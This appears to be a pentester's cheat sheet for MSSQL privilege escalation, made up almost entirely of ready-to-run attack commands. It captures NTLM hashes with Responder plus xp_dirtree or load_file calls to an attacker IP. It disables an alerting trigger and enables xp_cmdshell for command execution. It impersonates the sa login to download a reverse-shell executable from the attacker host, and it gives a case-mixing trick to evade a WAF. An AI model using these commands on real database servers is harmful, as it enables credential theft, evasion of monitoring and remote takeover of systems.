---
title: "MSSQL Privilege Escalation"
date: 2024-6-27
tags: ["mssql", "database", "Windows", "exploit", "rce", "privesc", "pe"]
---

---
### Abuse #1: Steal NTLM hash

<div>

```bash
# In our local Linux machine
sudo responder -I tun0
```

</div>

{{< tab set1 tab1 active >}}Method 1{{< /tab >}}
{{< tab set1 tab2 >}}Method 2{{< /tab >}}
{{< tab set1 tab3 >}}Method 3{{< /tab >}}
{{< tabcontent set1 tab1 >}}

<div>

```mysql
xp_dirtree '\\10.10.14.10\any\thing';
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

<div>

```mysql
use master; exec xp_dirtree '\\10.10.14.10\any\thing';
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

<div>

```mysql
load_file('\\10.10.14.10\any\thing');
```

</div>

{{< /tabcontent >}}

### Abuse #2: Run xp_cmdshell

<div>

```mysql
# Check any policy blocking xp_cmdshell
select name from sys.server_triggers;
```

```mysql
# Disable trigger if any
disable trigger ALERT_xp_cmdshell on all server;
```

```mysql
# Enable xp_cmdshell
enable_xp_cmdshell;
```

```mysql
# RCE
xp_cmdshell whoami
```

</div>

### Abuse #3: Impersonate sa to run xp_cmdshell

<div>

```mysql
execute as login = 'sa'; exec sp_configure 'show advanced options', 1;
```

```mysql
execute as login = 'sa'; reconfigure;
```

```mysql
execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1;
```

```mysql
execute as login = 'sa'; reconfigure;
```

```mysql
execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe'
```

</div>

<small>*Note: try xp_cmDshElL to bypass WAF*</small>

### Abuse #4: Run External Script

<div>

```mysql
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
```

</div>

<br>